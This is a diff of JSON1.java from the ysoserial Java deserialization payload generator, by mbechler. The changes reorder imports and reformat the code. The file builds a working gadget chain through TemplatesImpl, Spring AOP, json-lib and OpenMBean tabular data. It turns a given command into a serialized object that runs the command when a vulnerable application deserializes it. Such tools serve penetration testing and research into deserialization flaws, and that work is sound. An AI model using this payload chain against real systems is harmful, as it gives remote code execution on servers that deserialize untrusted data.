@@ -1,34 +1,25 @@
 package ysoserial.payloads;
 
 
+import net.sf.json.JSONObject;
+import org.springframework.aop.framework.AdvisedSupport;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
+import javax.management.openmbean.*;
+import javax.xml.transform.Templates;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.InvocationTargetException;
 import java.util.HashMap;
 import java.util.Map;
 
-import javax.management.openmbean.CompositeData;
-import javax.management.openmbean.CompositeType;
-import javax.management.openmbean.OpenDataException;
-import javax.management.openmbean.OpenType;
-import javax.management.openmbean.TabularDataSupport;
-import javax.management.openmbean.TabularType;
-
-import javax.xml.transform.Templates;
-
-import org.springframework.aop.framework.AdvisedSupport;
-import net.sf.json.JSONObject;
-
 
 /**
- *
  * A bit more convoluted example
- *
+ * <p>
  * com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()
  * java.lang.reflect.Method.invoke(Object, Object...)
  * org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(Object, Method, Object[])
@@ -54,37 +45,31 @@ import net.sf.json.JSONObject;
  * java.util.HashMap<K,V>.readObject(ObjectInputStream)
  *
  * @author mbechler
- *
  */
-@SuppressWarnings ( {
+@SuppressWarnings({
     "rawtypes", "unchecked", "restriction"
-} )
-@Dependencies({ "net.sf.json-lib:json-lib:jar:jdk15:2.4", "org.springframework:spring-aop:4.1.4.RELEASE",
+})
+@Dependencies({"net.sf.json-lib:json-lib:jar:jdk15:2.4", "org.springframework:spring-aop:4.1.4.RELEASE",
     // deep deps
     "aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2", "commons-lang:commons-lang:2.6",
     "net.sf.ezmorph:ezmorph:1.0.6", "commons-beanutils:commons-beanutils:1.9.2",
-    "org.springframework:spring-core:4.1.4.RELEASE", "commons-collections:commons-collections:3.1" })
-@Authors({ Authors.MBECHLER })
+    "org.springframework:spring-core:4.1.4.RELEASE", "commons-collections:commons-collections:3.1"})
+@Authors({Authors.MBECHLER})
 public class JSON1 implements ObjectPayload<Object> {
-
-    public Map getObject ( String command ) throws Exception {
-        return makeCallerChain(Gadgets.createTemplatesImpl(command), Templates.class);
-    }
-
 
     /**
      * Will call all getter methods on payload that are defined in the given interfaces
      */
-    public static Map makeCallerChain ( Object payload, Class... ifaces ) throws OpenDataException, NoSuchMethodException, InstantiationException,
-            IllegalAccessException, InvocationTargetException, Exception, ClassNotFoundException {
-        CompositeType rt = new CompositeType("a", "b", new String[] {
+    public static Map makeCallerChain(Object payload, Class... ifaces) throws OpenDataException, NoSuchMethodException, InstantiationException,
+        IllegalAccessException, InvocationTargetException, Exception, ClassNotFoundException {
+        CompositeType rt = new CompositeType("a", "b", new String[]{
             "a"
-        }, new String[] {
+        }, new String[]{
             "a"
-        }, new OpenType[] {
+        }, new OpenType[]{
             javax.management.openmbean.SimpleType.INTEGER
         });
-        TabularType tt = new TabularType("a", "b", rt, new String[] {
+        TabularType tt = new TabularType("a", "b", rt, new String[]{
             "a"
         });
         TabularDataSupport t1 = new TabularDataSupport(tt);
@@ -111,8 +96,12 @@ public class JSON1 implements ObjectPayload<Object> {
         return Gadgets.makeMap(t1, t2);
     }
 
-    public static void main ( final String[] args ) throws Exception {
+    public static void main(final String[] args) throws Exception {
         PayloadRunner.run(JSON1.class, args);
+    }
+
+    public Map getObject(String command) throws Exception {
+        return makeCallerChain(Gadgets.createTemplatesImpl(command), Templates.class);
     }
 
 }
